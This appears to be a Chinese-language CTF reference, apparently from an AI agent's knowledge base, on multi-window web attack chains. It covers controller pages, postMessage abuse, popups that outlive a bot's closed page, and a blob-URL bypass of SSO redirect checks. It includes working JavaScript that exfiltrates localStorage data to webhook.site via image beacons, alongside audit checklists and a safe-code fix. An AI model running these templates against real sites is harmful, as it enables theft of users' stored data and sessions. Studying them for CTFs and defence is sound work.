# 多步骤攻击编排模式

> 多步骤攻击编排参考。当单步攻击无法完成目标时，需要通过多个窗口/页面之间的协作来编排攻击链。

---

## 1. 控制器页面模式

### 1.1 什么是控制器页面

控制器页面是攻击者控制的一个外部 HTML 页面，负责：
1. 打开目标应用的弹窗
2. 接收来自弹窗内部的消息（通过 postMessage）
3. 协调攻击链的后续步骤

```
控制器页面（攻击者控制）
├── 打开弹窗A → 目标应用（导入恶意内容）
├── 监听 postMessage → 收到来自 iframe 的 blob URL
├── 打开弹窗B → SSO 回调（利用 blob URL）
└── 整个攻击链在多个窗口间协作完成
```

### 1.2 控制器页面模板

```html
<!doctype html>
<html><body><script>
var CHALLENGE = 'http://challenge:4173';  // 内网地址
var WEBHOOK   = 'https://webhook.site/xxx';

// 日志函数（通过图片请求外发日志）
function log(tag, data) {
  new Image().src = WEBHOOK + '/?t=' + encodeURIComponent(tag)
    + '&d=' + encodeURIComponent(data || '') + '&_=' + Date.now();
}

log('ctrl', 'start');

// 步骤 1：打开目标应用并导入恶意内容
window.open(CHALLENGE + '/new/?url=' + encodeURIComponent(NOTEBOOK_URL), 'seed');
log('step1', 'opened_seed');

// 步骤 2：监听来自 sandboxed iframe 的消息
window.addEventListener('message', function(ev) {
  try {
    if (!ev.data || ev.data.type !== 'blob_leak' || !ev.data.href) return;
    log('blob', ev.data.href);

    // 步骤 3：利用 SSO 回调重定向到 blob URL
    var ssoUrl = CHALLENGE + '/auth/?sso=callback&mode=login&token=x'
      + '&return=' + encodeURIComponent(ev.data.href);
    window.open(ssoUrl, '_blank', 'noopener');
    log('step3', 'opened_sso');
  } catch(e) {
    log('error', String(e));
  }
});
</script></body></html>
```

### 1.3 托管控制器页面的方式

| 方式 | URL 格式 | 优点 | 缺点 |
|------|---------|------|------|
| httpbin.org/base64 | `https://httpbin.org/base64/<base64>` | 无需自己的服务器 | URL 很长，某些 Bot 可能限制 URL 长度 |
| webhook.site 默认响应 | `https://webhook.site/<uuid>` | 可配置 Content-Type | 令牌有时效 |
| 攻击者自己的服务器 | `https://evil.com/ctrl.html` | 完全控制 | 需要有服务器 |
| data: URI | `data:text/html;base64,...` | 无需服务器 | 某些浏览器阻止顶级导航到 data: URI |

---

## 2. postMessage 跨窗口通信攻击

### 2.1 postMessage 基础

```javascript
// 发送方（iframe 内）
window.top.postMessage({ type: 'blob_leak', href: location.href }, '*');

// 接收方（控制器页面）
window.addEventListener('message', function(ev) {
  console.log(ev.data);  // { type: 'blob_leak', href: 'blob:http://...' }
});
```

### 2.2 sandbox 中的 postMessage

即使在 `sandbox="allow-scripts"` 的 iframe 中（无 `allow-same-origin`），JS 仍然可以：
- 调用 `window.top.postMessage()` 发送消息给父页面
- 调用 `window.parent.postMessage()` 发送消息给父页面
- 使用 `window.open()` 打开新窗口（如果有 `allow-popups`）

**利用场景**：sandboxed iframe 中的 JS 无法访问 localStorage，但可以把 blob URL 通过 postMessage 传给外部的控制器页面，让控制器页面构造逃逸路径。

### 2.3 postMessage 安全审计

| 检查项 | 说明 |
|--------|------|
| origin 验证 | `addEventListener('message', fn)` 中是否检查 `ev.origin`？ |
| 数据验证 | 是否检查 `ev.data` 的结构和类型？ |
| 敏感数据传递 | 是否通过 postMessage 传递了敏感数据（如 token、URL）？ |
| 消息触发的操作 | 收到消息后是否执行了危险操作（如重定向、执行代码）？ |

---

## 3. Bot 时间差利用

### 3.1 firstPage/popup 存活模式

**Bot 行为模式**（常见于 CTF）：

```javascript
// Bot 的典型流程
const firstPage = await browser.newPage();
await firstPage.goto(userUrl);       // 访问攻击者 URL
await firstPage.close();              // 关闭

const secondPage = await browser.newPage();
await registerAndLogin(secondPage);   // 注册登录
await saveFlag(secondPage);           // 保存 flag
await secondPage.close();

await browser.close();                // 关闭所有
```

**关键点**：`firstPage.close()` 不会关闭 firstPage 通过 `window.open()` 打开的 popup。popup 会继续存活，直到 `browser.close()`。

```
browser
├── firstPage (被 close)
│   └── popup (仍然存活！由 firstPage 中的 JS 打开)
├── secondPage (后续创建)
└── ...
```

### 3.2 利用条件

| 条件 | 说明 |
|------|------|
| 攻击者 URL 可以开 popup | firstPage 中没有限制 `window.open()` |
| popup 的 origin 与 flag 同源 | popup 需要在正确的域名下运行 |
| flag 写入和 popup 存活有时间重叠 | popup 轮询时 flag 已经被写入 |
| popup 能外泄数据 | 有外网或有其他渗出方式 |

### 3.3 轮询等待 + 自动外泄模板

```javascript
(function() {
  var WEBHOOK = 'https://webhook.site/xxx';
  var FLAG_RE = /CTF_PATTERN\{[^}]+\}/;

  function exfil(tag, data) {
    try {
      new Image().src = WEBHOOK + '/?t=' + encodeURIComponent(tag)
        + '&d=' + encodeURIComponent(data || '') + '&_=' + Date.now();
    } catch(e) {}
  }

  // 检查当前是否是顶级页面（无 sandbox）
  if (window.top !== window) {
    // 还在 iframe 中，尝试逃逸
    try {
      // 方案 1：通过 postMessage 把 blob URL 传出去
      top.opener.postMessage(
        { type: 'blob_leak', href: location.href },
        '*'
      );
    } catch(e) {}
    return;
  }

  // 已经是顶级页面（成功逃逸），开始轮询
  exfil('top', 'polling');
  var lastData = null;
  var tick = 0;
  var iv = setInterval(function() {
    tick++;
    try {
      // 读取 localStorage 中的用户数据
      var users = localStorage.getItem('app.users.v1') || '';
      if (users !== lastData) {
        lastData = users;
        exfil('data', users.substring(0, 3000));
      }
      // 搜索 flag 模式
      var match = users.match(FLAG_RE);
      if (match) {
        exfil('flag', match[0]);
        clearInterval(iv);
      }
    } catch(e) {
      exfil('error', String(e));
    }
    if (tick > 200) clearInterval(iv);  // 超时（100 秒）
  }, 500);
})();
```

---

## 4. SSO/OAuth 回调安全审计

### 4.1 回调 URL 验证模式

```javascript
// 典型验证逻辑
function getSafeReturnTarget() {
  const candidate = params.get('return');
  try {
    const parsed = new URL(candidate, window.location.origin);
    if (parsed.origin === window.location.origin) return parsed.toString();
  } catch {}
  return defaultUrl;
}
```

### 4.2 blob URL 绕过

`new URL('blob:http://example.com/uuid').origin` 返回 `'http://example.com'`——blob URL 继承创建者的 origin。

**利用步骤**：
1. 在目标域上创建 blob URL（如通过 XSS 或 notebook 导入）
2. 将 blob URL 作为 `return` 参数传给 SSO 回调
3. 回调验证 `new URL(blobUrl).origin === window.location.origin` → 通过
4. 用户被重定向到 blob URL，恶意内容在目标域的 origin 下加载

> blob URL 的 origin 继承原理、完整利用步骤及与其他绕过方式（javascript:/data:/@混淆）的对比，见 `$AGENT_DIR/knowledge-base/web-vulnerabilities.md` §7 "开放重定向"。

### 4.3 审计清单

- [ ] 搜索所有 `redirect`、`return`、`callback`、`next` 参数
- [ ] 检查 origin 验证是否只检查 `parsed.origin === window.location.origin`
- [ ] 测试 `blob:` 协议 URL 是否通过验证
- [ ] 测试 `javascript:` 和 `data:` 协议 URL
- [ ] 检查 hash 部分（`#return=xxx`）是否也被处理
- [ ] 检查 URL 构造是否使用 `new URL(candidate, base)`（base 可能被利用）

### 4.4 安全写法

```javascript
// 安全：检查协议必须是 http 或 https
function getSafeReturnTarget() {
  const candidate = params.get('return');
  try {
    const parsed = new URL(candidate, window.location.origin);
    if (parsed.origin === window.location.origin
        && (parsed.protocol === 'http:' || parsed.protocol === 'https:')) {
      return parsed.toString();
    }
  } catch {}
  return defaultUrl;
}
```

---

## 5. 完整攻击编排案例

### 5.1 Yipiter 完整编排

```
组件：
  - 控制器页面（httpbin.org 托管）
  - 恶意 notebook JSON（webhook.site 托管）
  - Bot 浏览器（firstPage + secondPage）

时间线：
  t=0s    Bot 的 firstPage 访问控制器页面 URL
  t=0.5s  控制器 window.open(challenge/new/?url=notebook) → 弹窗 seed
  t=1s    challenge 应用下载恶意 notebook
  t=2s    sandboxed iframe 中的 JS 执行 → postMessage(blobUrl) 给控制器
  t=2.5s  控制器收到 blob URL → window.open(sso_callback?return=blobUrl)
  t=3s    SSO 回调验证 blob URL origin → 通过 → 重定向到 blob URL
  t=3.5s  blob URL 作为顶级页面加载 → 无 sandbox → 开始轮询 localStorage
  t=5s    Bot 关闭 firstPage（popup 和顶级 blob 页面存活）
  t=8s    Bot 在 secondPage 注册新用户
  t=12s   Bot 执行 print(FLAG) → 保存到 localStorage
  t=12.5s 轮询检测到 flag → Image beacon 外泄到 webhook
  t=13s   Bot 关闭浏览器
```

### 5.2 future.js 完整编排

```
组件：
  - Python 攻击脚本（攻击者运行）
  - nginx 缓存（中间人）
  - Next.js 应用（目标）
  - Bot 浏览器（单页面）

时间线：
  Step 1: 攻击者投毒缓存（带 Host/RSC/CT/x-nonce/AE）
  Step 2: 攻击者验证缓存命中（模拟 Bot 请求）
  Step 3: 攻击者发送 Bot URL
  Step 4: Bot 访问投毒 URL → HIT → XSS 执行
  Step 5: XSS 读取 Cookie → fetch 到另一个缓存路径
  Step 6: 攻击者读取第二个缓存路径 → 拿到 flag
```
